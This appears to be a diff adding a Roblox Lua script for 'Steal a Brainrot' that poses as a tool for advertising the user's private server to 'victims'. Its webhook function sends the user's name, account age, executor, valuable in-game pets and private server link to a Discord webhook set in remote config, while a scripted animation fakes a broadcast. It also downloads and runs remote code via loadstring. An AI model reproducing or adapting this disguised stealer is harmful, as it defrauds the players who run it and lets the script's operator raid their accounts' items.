@@ -1,0 +1,581 @@
+-- Services (single place)
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
+local localPlayer = player
+
+-- Hide default leaderboard
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+
+-- Load config from GitHub (unchanged)
+local config = {}
+do
+    local ok, res = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/realscript/refs/heads/main/config"))()
+    end)
+    if ok and type(res) == "table" then
+        config = res
+    else
+        config = {
+            WEBHOOK = "",
+            targetNames = {},
+            Receiver = {}
+        }
+    end
+end
+
+local WEBHOOK = config.WEBHOOK
+local targetNames = config.targetNames or {}
+local receiverList = table.concat(config.Receiver or {}, ", ")
+
+-- Load emoji table from GitHub raw
+local Brainrots = {}
+do
+    local ok, tbl = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/emojiforstlr/refs/heads/main/emojis"))()
+    end)
+    if ok and type(tbl) == "table" then
+        Brainrots = tbl
+    else
+        warn("Failed to load emoji table; default 🧠 will be used")
+    end
+end
+
+-- Function to normalize strings
+local function normalizeName(name)
+    return (name:gsub("%s+", " "):gsub("^%s*(.-)%s*$", "%1"):lower())
+end
+
+-- Executor & account age detection
+local function detectExecutor()
+    if syn then return "Synapse X"
+    elseif KRNL_LOADED then return "KRNL"
+    elseif fluxus then return "Fluxus"
+    elseif secure_load then return "Sentinel"
+    elseif getexecutorname then return getexecutorname()
+    elseif identifyexecutor then return identifyexecutor()
+    else return "Unknown" end
+end
+
+local function getAccountAge()
+    return player and player.AccountAge or 0
+end
+
+-- Detect server type
+local serverType = "UNKNOWN"
+local map = Workspace:FindFirstChild("Map")
+if map then
+    local codes = map:FindFirstChild("Codes")
+    local main = codes and codes:FindFirstChild("Main")
+    local surfaceGui = main and main:FindFirstChild("SurfaceGui")
+    local sFrame = surfaceGui and surfaceGui:FindFirstChild("MainFrame")
+    local privateMsg = sFrame and sFrame:FindFirstChild("PrivateServerMessage")
+    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
+end
+
+-- Only allow private servers
+if serverType == "PUBLIC SERVER" then
+    warn("Only use this script in private servers")
+    return
+end
+
+-- Get priority index for a pet name
+local function getPriority(name)
+    for i, t in ipairs(targetNames) do
+        if t.name and name:find(t.name) then
+            return i
+        end
+    end
+    return math.huge
+end
+
+-- Parse numeric value like "7.5M/s"
+local function parseValue(str)
+    local num = tonumber(str:match("[%d%.]+")) or 0
+    if str:find("K") then return num * 1e3
+    elseif str:find("M") then return num * 1e6
+    elseif str:find("B") then return num * 1e9
+    else return num end
+end
+
+local PRICE_LIMIT = 1
+
+-- Floor detection functions
+local function getNearestFloor(plot, model)
+    local podiums = plot:FindFirstChild("AnimalPodiums")
+    if not podiums then return "? Floor" end
+
+    local closest = math.huge
+    local floor = "? Floor"
+
+    for _, podium in pairs(podiums:GetChildren()) do
+        if podium:IsA("Model") then
+            local basePart = podium:FindFirstChild("Base")
+            if not (basePart and basePart:IsA("BasePart")) then
+                for _, sub in pairs(podium:GetDescendants()) do
+                    if sub:IsA("BasePart") then
+                        basePart = sub
+                        break
+                    end
+                end
+            end
+            if basePart then
+                local success, dist = pcall(function()
+                    return (basePart.Position - model:GetPivot().Position).Magnitude
+                end)
+                if success and dist < closest then
+                    closest = dist
+                    local num = tonumber(podium.Name:match("^(%d+)_?"))
+                    if num then
+                        if num>=1 and num<=10 then floor="1st Floor"
+                        elseif num<=18 then floor="2nd Floor"
+                        else floor="3rd Floor" end
+                    end
+                end
+            end
+        end
+    end
+    return floor
+end
+
+local function findOverheadsInPart(part)
+    local result = {}
+    if part:IsA("Attachment") then
+        local oh = part:FindFirstChild("AnimalOverhead")
+        if oh then table.insert(result, oh) end
+    end
+    for _, c in pairs(part:GetChildren()) do
+        local sub = findOverheadsInPart(c)
+        for _, s in pairs(sub) do table.insert(result, s) end
+    end
+    return result
+end
+
+-- Scan player's base
+local function scanMyBase()
+    local pets = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return pets end
+
+    for _, plot in pairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
+            local seen = {}
+
+            -- AnimalPodiums
+            local podiums = plot:FindFirstChild("AnimalPodiums")
+            if podiums then
+                for _, podium in pairs(podiums:GetChildren()) do
+                    if podium:IsA("Model") then
+                        local num = tonumber(podium.Name:match("^(%d+)_?"))
+                        local floor = "Unknown Floor"
+                        if num then
+                            if num>=1 and num<=10 then floor="1st Floor"
+                            elseif num<=18 then floor="2nd Floor"
+                            else floor="3rd Floor" end
+                        end
+
+                        local base = podium:FindFirstChild("Base")
+                        local spawn = base and base:FindFirstChild("Spawn")
+                        if spawn and spawn:FindFirstChild("Attachment") then
+                            local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
+                            if overhead then
+                                local displayName = overhead:FindFirstChild("DisplayName")
+                                local priceLabel = overhead:FindFirstChild("Generation")
+                                if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
+                                    local nameText = displayName.Text
+                                    local priceText = priceLabel.Text
+                                    local priceNum = parseValue(priceText)
+                                    local uniqueKey = nameText.."_"..floor.."_"..priceText
+                                    if not seen[uniqueKey] and (priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge) then
+                                        table.insert(pets, {name=nameText, value=priceText, floor=floor, num=priceNum})
+                                        seen[uniqueKey] = true
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+
+            -- Special models (FakeRootPart)
+            for _, model in pairs(plot:GetChildren()) do
+                if model:IsA("Model") and model:FindFirstChild("FakeRootPart") and not model.Name:lower():find("friendpanel") and model.Name~="AnimalPodiums" then
+                    local fakeRoot = model.FakeRootPart
+                    local floor = getNearestFloor(plot, model)
+                    for _, overhead in pairs(findOverheadsInPart(fakeRoot)) do
+                        local name = overhead:FindFirstChild("DisplayName")
+                        local gen = overhead:FindFirstChild("Generation")
+                        if name and gen and name:IsA("TextLabel") and gen:IsA("TextLabel") then
+                            local nameText = name.Text
+                            local genText = gen.Text
+                            local genValue = parseValue(genText)
+                            local uniqueKey = nameText.."_"..floor.."_"..genText
+                            if not seen[uniqueKey] and (genValue >= PRICE_LIMIT or getPriority(nameText) ~= math.huge) then
+                                table.insert(pets, {name=nameText, value=genText, floor=floor, num=genValue})
+                                seen[uniqueKey] = true
+                            end
+                        end
+                    end
+                end
+            end
+
+            break -- only own plot
+        end
+    end
+    return pets
+end
+
+-- Send webhook with emoji detection
+local function sendWebhook(pets, privateServerLink)
+    if not pets or #pets == 0 then return end
+    if player and player:GetAttribute("WebhookSent") then return end
+
+    local highValueThreshold = 7.5e6
+    local priorityPets, normalPets = {}, {}
+    local shouldPing = false
+
+    for _, pet in ipairs(pets) do
+        local valueNum = pet.num or parseValue(pet.value)
+        local emoji = Brainrots[normalizeName(pet.name)] or "🧠"
+        local line = string.format("%s %s → %s → %s", emoji, pet.name, pet.value, pet.floor)
+        if valueNum >= highValueThreshold then
+            shouldPing = true
+            table.insert(priorityPets, {line=line, valueNum=valueNum})
+        else
+            table.insert(normalPets, {line=line, valueNum=valueNum})
+        end
+    end
+
+    table.sort(priorityPets, function(a,b) return a.valueNum > b.valueNum end)
+    table.sort(normalPets, function(a,b) return a.valueNum > b.valueNum end)
+
+    local orderedLines = {}
+    for _, p in ipairs(priorityPets) do table.insert(orderedLines, p.line) end
+    for _, n in ipairs(normalPets) do table.insert(orderedLines, n.line) end
+
+    local lootText = #orderedLines > 0 and table.concat(orderedLines, "\n") or "Empty"
+    if lootText == "Empty" then return end
+
+    local playerInfoText = "```" ..
+        "Name: "..(player and player.Name or "Unknown").."\n"..
+        "Receiver: "..receiverList.."\n"..
+        "Executor: "..detectExecutor().."\n"..
+        "Account Age: "..tostring(getAccountAge()).." days".."```"
+
+    local petsText = "```"..lootText.."```"
+    local serverLink = privateServerLink or "No link entered"
+
+    local embed = {
+        ["title"] = "🧠 Steal a Brainrot HIT! - bloomscripts 🧠",
+        ["color"] = 12413107,
+        ["fields"] = {
+            {["name"]="Players", ["value"]=string.format("%d/6", #Players:GetPlayers())},
+            {["name"]="Server Type", ["value"]=serverType},
+            {["name"]="👥 Player Info", ["value"]=playerInfoText},
+            {["name"]="🎒 Brainrots in Base", ["value"]=petsText},
+            {["name"]="Join Server Link", ["value"]=("[Click to Join Server](%s)"):format(serverLink)}
+        }
+    }
+
+    local payload = {
+        ["content"] = shouldPing and "@everyone 🔥 **High Value Brainrot Detected!** 🔥" or "",
+        ["embeds"] = {embed},
+        ["allowed_mentions"] = {["parse"] = shouldPing and {"everyone"} or {}}
+    }
+
+    local req = (syn and syn.request) or http_request or (http and http.request) or request
+    if req and WEBHOOK and WEBHOOK ~= "" then
+        pcall(function()
+            req({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"]="application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if player then
+            player:SetAttribute("WebhookSent", true)
+        end
+    end
+end
+
+-- VALID PS LINK FUNCTION
+local function isValidPrivateServerLink(txt)
+    return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
+end
+
+--// GUI SETUP - MORERA STYLE
+local playerGui = player:WaitForChild("PlayerGui")
+
+local gui = Instance.new("ScreenGui", playerGui)
+gui.Name = "Auto Moreira"
+gui.ResetOnSpawn = false
+
+-- MAIN FRAME
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 420, 0, 320)
+frame.Position = UDim2.new(0.5, -210, 0.5, -160)
+frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+frame.BorderSizePixel = 0
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+
+-- TITLE
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "Auto Moreira"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 18
+
+-- DRAGGING FUNCTION
+local dragging, dragInput, dragStart, startPos
+local function update(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
+    end
+end)
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then update(input) end
+end)
+
+-- X BUTTON
+local closeBtn = Instance.new("TextButton", frame)
+closeBtn.Size = UDim2.new(0, 35, 0, 30)
+closeBtn.Position = UDim2.new(1, -40, 0, 5)
+closeBtn.Text = "X"
+closeBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+closeBtn.TextColor3 = Color3.fromRGB(255,255,255)
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 16
+Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
+closeBtn.MouseButton1Click:Connect(function()
+    gui:Destroy()
+end)
+
+-- HIDE BUTTON (DRAGGABLE WITH DECAL)
+local hideBtn = Instance.new("ImageButton", gui)
+hideBtn.Size = UDim2.new(0, 40, 0, 40)
+hideBtn.Position = UDim2.new(0, 10, 0, 10)
+hideBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+hideBtn.BorderSizePixel = 0
+Instance.new("UICorner", hideBtn).CornerRadius = UDim.new(1, 0)
+-- decal image
+local success, err = pcall(function()
+    hideBtn.Image = "rbxassetid://112674369870793"
+end)
+if not success then
+    hideBtn.Image = "" -- fallback black circle
+end
+
+local hidden = false
+hideBtn.MouseButton1Click:Connect(function()
+    hidden = not hidden
+    frame.Visible = not hidden
+end)
+
+-- DRAGGABLE HIDE BUTTON
+local draggingHide, dragStartHide, startPosHide, dragInputHide
+hideBtn.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingHide = true
+        dragStartHide = input.Position
+        startPosHide = hideBtn.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                draggingHide = false
+            end
+        end)
+    end
+end)
+
+hideBtn.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInputHide = input
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInputHide and draggingHide then
+        local delta = input.Position - dragStartHide
+        hideBtn.Position = UDim2.new(
+            startPosHide.X.Scale, startPosHide.X.Offset + delta.X,
+            startPosHide.Y.Scale, startPosHide.Y.Offset + delta.Y
+        )
+    end
+end)
+
+-- INPUT BOX
+local psInput = Instance.new("TextBox", frame)
+psInput.Size = UDim2.new(0, 400, 0, 40)
+psInput.Position = UDim2.new(0, 10, 0, 50)
+psInput.PlaceholderText = "Enter Private Server Link"
+psInput.Text = ""
+psInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+psInput.TextColor3 = Color3.fromRGB(255,255,255)
+psInput.Font = Enum.Font.GothamBold
+psInput.TextSize = 15
+Instance.new("UICorner", psInput).CornerRadius = UDim.new(0, 6)
+
+-- Status label for validation
+local statusLabel = Instance.new("TextLabel", frame)
+statusLabel.Size = UDim2.new(0, 400, 0, 24)
+statusLabel.Position = UDim2.new(0, 10, 0, 90)
+statusLabel.Text = ""
+statusLabel.Font = Enum.Font.GothamBold
+statusLabel.TextSize = 14
+statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+statusLabel.BackgroundTransparency = 1
+
+-- Validate input on text change
+psInput:GetPropertyChangedSignal("Text"):Connect(function()
+    if isValidPrivateServerLink(psInput.Text) then
+        statusLabel.Text = "Valid ✅"
+        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    else
+        statusLabel.Text = "Invalid ❌"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    end
+end)
+
+-- SUBMIT BUTTON
+local submitBtn = Instance.new("TextButton", frame)
+submitBtn.Size = UDim2.new(0, 400, 0, 40)
+submitBtn.Position = UDim2.new(0, 10, 0, 120)
+submitBtn.Text = "SUBMIT PRIVATE SERVER LINK"
+submitBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 255)
+submitBtn.TextColor3 = Color3.fromRGB(255,255,255)
+submitBtn.Font = Enum.Font.GothamBold
+submitBtn.TextSize = 16
+Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0, 6)
+
+-- OUTPUT BOX
+local outputBox = Instance.new("ScrollingFrame", frame)
+outputBox.Size = UDim2.new(0, 400, 0, 150)
+outputBox.Position = UDim2.new(0, 10, 0, 170)
+outputBox.CanvasSize = UDim2.new(0, 0, 0, 0)
+outputBox.ScrollBarThickness = 6
+outputBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Instance.new("UICorner", outputBox).CornerRadius = UDim.new(0, 6)
+
+local layout = Instance.new("UIListLayout", outputBox)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Padding = UDim.new(0, 2)
+
+-- TIMESTAMP + ADD LINE
+local function timestamp()
+    local t = os.date("*t")
+    return string.format("[%02d:%02d:%02d]", t.hour, t.min, t.sec)
+end
+
+local function addLine(text, color)
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, -10, 0, 16)
+    lbl.BackgroundTransparency = 1
+    lbl.Font = Enum.Font.Gotham
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.TextSize = 12
+    lbl.RichText = true
+    lbl.TextColor3 = color
+    lbl.Text = "<b>" .. timestamp() .. " " .. text .. "</b>"
+    lbl.Parent = outputBox
+
+    task.wait()
+    outputBox.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
+    outputBox.CanvasPosition = Vector2.new(0, layout.AbsoluteContentSize.Y)
+end
+
+-- PREPARING TEXTS (from Moreira script)
+local preparingMessages = {
+    "verifying server link...",
+    "checking validity...",
+    "preparing to send link...",
+    "connecting to roblox network...",
+    "sending link to roblox contacts...",
+    "sending link to players...",
+    "initializing broadcast system...",
+    "scanning for active roblox forums...",
+}
+
+-- MAIN LOGIC - Webhook sent instantly, then show Moreira animation
+submitBtn.MouseButton1Click:Connect(function()
+    local txt = psInput.Text or ""
+    if not isValidPrivateServerLink(txt) then
+        addLine("Error: Invalid private server link format.", Color3.fromRGB(255, 60, 60))
+        return
+    end
+
+    -- INSTANTLY SCAN AND SEND WEBHOOK
+    addLine("Scanning base for brainrots...", Color3.fromRGB(255, 255, 0))
+    
+    local pets = scanMyBase()
+    if #pets > 0 then
+        addLine("Found " .. #pets .. " brainrots in base!", Color3.fromRGB(0, 255, 0))
+        sendWebhook(pets, txt)
+        addLine("Webhook sent with brainrot information!", Color3.fromRGB(0, 255, 0))
+    else
+        addLine("No high-value brainrots found in base.", Color3.fromRGB(255, 140, 0))
+        -- Still send webhook with empty results
+        sendWebhook({}, txt)
+    end
+    
+    addLine("Starting Moreira broadcast simulation...", Color3.fromRGB(255, 255, 0))
+    
+    -- THEN START THE MOREIRA ANIMATION
+    local startTime = tick()
+    -- FIRST 15 SECONDS - simulate sending messages (Moreira functionality)
+    while tick() - startTime < 15 do
+        task.wait(0.05)
+        local roll = math.random(1, 10)
+        if roll <= 4 then
+            addLine(preparingMessages[math.random(1, #preparingMessages)], Color3.fromRGB(255, 255, 0))
+        else
+            addLine("sending private server link to multiple roblox forums...", Color3.fromRGB(255, 255, 0))
+        end
+    end
+
+    local endTime = tick()
+    -- NEXT 3 MINUTES 45s - success/fail/potential victim messages
+    while tick() - endTime < 225 do
+        task.wait(0.1)
+        local roll = math.random(1, 15)
+        if roll <= 7 then
+            addLine("sent successfully!", Color3.fromRGB(0, 255, 0))
+        elseif roll <= 11 then
+            addLine("potential victim found!", Color3.fromRGB(255, 140, 0))
+        elseif roll <= 13 then
+            addLine("sent failed!", Color3.fromRGB(255, 0, 0))
+        end
+    end
+
+    task.wait(0.2)
+    addLine("Your private server link has been sent successfully!", Color3.fromRGB(0, 255, 0))
+    task.wait(0.3)
+    addLine("Wait for the victims to join!", Color3.fromRGB(0, 255, 0))
+end)
+
+-- Also handle Enter key press
+psInput.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        submitBtn.MouseButton1Click:Connect()
+    end
+end)
